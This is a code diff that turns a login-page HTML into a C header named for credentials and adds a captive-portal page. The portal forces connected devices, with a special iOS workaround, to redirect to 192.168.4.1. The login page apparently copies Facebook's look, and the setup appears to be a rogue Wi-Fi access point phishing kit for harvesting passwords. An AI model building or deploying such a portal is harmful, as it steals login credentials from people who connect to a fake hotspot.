@@ -1,3 +1,7 @@
+#ifndef CREDENTIALS_H
+#define CREDENTIALS_H
+
+const char login_html[] PROGMEM = R"rawliteral(
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -5,141 +9,94 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Login Page</title>
   <style>
-   body {
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f0f2f5;
       margin: 0;
       padding: 0;
-      font-family: Helvetica, Arial, sans-serif;
-      background-color: #f0f2f5;
       display: flex;
       justify-content: center;
       align-items: center;
-      min-height: 100vh;
+      height: 100vh;
     }
-
     .container {
       display: flex;
       flex-direction: column;
       align-items: center;
-      max-width: 1000px;
-      width: 100%;
-      padding: 20px;
+      max-width: 980px;
     }
-
     .logo-section {
       text-align: center;
       margin-bottom: 20px;
     }
-
     .logo {
-      color: #1877f2;
-      font-size: 56px;
+      font-size: 48px;
       font-weight: bold;
-      margin-bottom: 16px;
+      color: #1877f2;
+      margin-bottom: 10px;
     }
-
     .logo-text {
-      font-size: 20px;
+      font-size: 24px;
+      font-weight: normal;
       line-height: 32px;
+      width: 500px;
       text-align: center;
-      margin-bottom: 20px;
     }
-
     .login-container {
-      background-color: white;
+      background-color: #fff;
       border-radius: 8px;
       box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
       padding: 20px;
-      width: 100%;
-      max-width: 396px;
-      box-sizing: border-box;
+      width: 396px;
     }
-
     .login-form {
       display: flex;
       flex-direction: column;
-      gap: 12px;
     }
-
-    input[type="text"],
-    input[type="password"] {
+    .login-form input {
+      height: 22px;
       padding: 14px 16px;
       border: 1px solid #dddfe2;
       border-radius: 6px;
+      margin-bottom: 15px;
       font-size: 17px;
-      width: 100%;
-      box-sizing: border-box;
     }
-
-    input[type="submit"] {
+    .login-form input[type="submit"] {
       background-color: #1877f2;
-      border: none;
-      border-radius: 6px;
       color: white;
       font-size: 20px;
       font-weight: bold;
-      padding: 14px 16px;
-      width: 100%;
+      height: 48px;
+      border: none;
+      border-radius: 6px;
       cursor: pointer;
     }
-
-    input[type="submit"]:hover {
-      background-color: #166fe5;
-    }
-
     .forgot-password {
       text-align: center;
-      margin: 16px 0;
+      margin-bottom: 20px;
     }
-
     .forgot-password a {
       color: #1877f2;
-      text-decoration: none;
       font-size: 14px;
+      text-decoration: none;
     }
-
     .divider {
       border-bottom: 1px solid #dadde1;
       margin: 20px 0;
     }
-
     .create-account {
       text-align: center;
     }
-
     .create-button {
       background-color: #42b72a;
+      color: white;
       border: none;
       border-radius: 6px;
-      color: white;
       font-size: 17px;
-      font-weight: bold;
-      padding: 14px 16px;
-      display: inline-block;
+      line-height: 48px;
+      padding: 0 16px;
       text-decoration: none;
-    }
-
-    .create-button:hover {
-      background-color: #36a420;
-    }
-
-    /* Media Queries for Responsiveness */
-    @media screen and (max-width: 600px) {
-      .logo {
-        font-size: 40px;
-      }
-
-      .logo-text {
-        font-size: 16px;
-      }
-
-      .login-container {
-        padding: 15px;
-      }
-
-      .login-form input {
-        font-size: 15px;
-        padding: 12px 14px;
-      }
+      display: inline-block;
     }
   </style>
 </head>
@@ -166,3 +123,43 @@
   </div>
 </body>
 </html>
+)rawliteral";
+
+const char captive_portal[] PROGMEM = R"rawliteral(
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
+    <script>
+        // Попытка редиректа для всех устройств
+        function redirect() {
+            window.location.replace("http://192.168.4.1/");
+        }
+        // Специальный обход для iOS
+        function iosRedirect() {
+            var iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = 'http://192.168.4.1/.well-known/ios-redirect?' + Math.random();
+            document.body.appendChild(iframe);
+            setTimeout(function() {
+                window.location.replace("http://192.168.4.1/");
+            }, 500);
+        }
+        // Пробуем оба метода
+        setTimeout(redirect, 100);
+        setTimeout(iosRedirect, 600);
+    </script>
+    <meta http-equiv="refresh" content="2; url=http://192.168.4.1/" />
+</head>
+<body onload="redirect()">
+    <p style="text-align: center; margin-top: 50px;">
+        Redirecting to login page...<br>
+        If not redirected automatically, <a href="http://192.168.4.1/">click here</a>.
+    </p>
+</body>
+</html>
+)rawliteral";
+
+#endif
